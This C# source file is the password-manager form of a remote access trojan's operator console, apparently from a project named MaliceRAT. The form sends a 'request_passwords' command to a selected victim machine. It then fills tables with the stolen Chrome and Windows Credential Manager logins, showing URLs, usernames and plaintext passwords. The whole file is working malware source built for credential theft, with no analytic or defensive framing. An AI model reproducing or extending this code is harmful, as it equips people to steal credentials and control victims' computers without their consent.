using System;
using System.Windows.Forms;
using System.Collections.Generic;
using System.Web.Script.Serialization;
using MaliceRAT.RatServer;

namespace MaliceRAT.RatUI
{
    public partial class PasswordManagerForm : Form
    {
        #region Variables
        private readonly int victimId;
        private readonly Server server;
        #endregion

        #region Constructor
        public PasswordManagerForm(int victimId, Server server)
        {
            InitializeComponent();
            this.victimId = victimId;
            this.server = server;

            server.GetVictimById(victimId).Send(new { type = "request_passwords" });
            server.MessageReceived += Server_MessageReceived;

            titleLabel.Text = $"Password Manager [{server.GetVictimById(victimId).User}]";
        }

        private void Server_MessageReceived(Victim victim, dynamic message)
        {
            if (victim.Id == victimId)
            {
                if (message["type"] == "passwords")
                {
                    var passwordData = new JavaScriptSerializer().Deserialize<PasswordData>(message["data"].ToString());

                    UpdatePasswordTable(gunaChromePasswordsTable, passwordData.chrome);
                    UpdatePasswordTable(gunaWCMPasswordsTable, passwordData.wcm);
                }
            }
        }

        private void UpdatePasswordTable(DataGridView table, List<CredentialModel> passwords)
        {
            table.Invoke((MethodInvoker)delegate {
                table.Rows.Clear();
                foreach (var password in passwords)
                {
                    table.Rows.Add(password.Url, password.Username, password.Password);
                }
            });
        }
        #endregion

        #region Helper Classes
        public class CredentialModel
        {
            public string Url { get; set; }
            public string Username { get; set; }
            public string Password { get; set; }
        }

        public class PasswordData
        {
            public List<CredentialModel> chrome { get; set; }
            public List<CredentialModel> wcm { get; set; }
        }
        #endregion
    }
}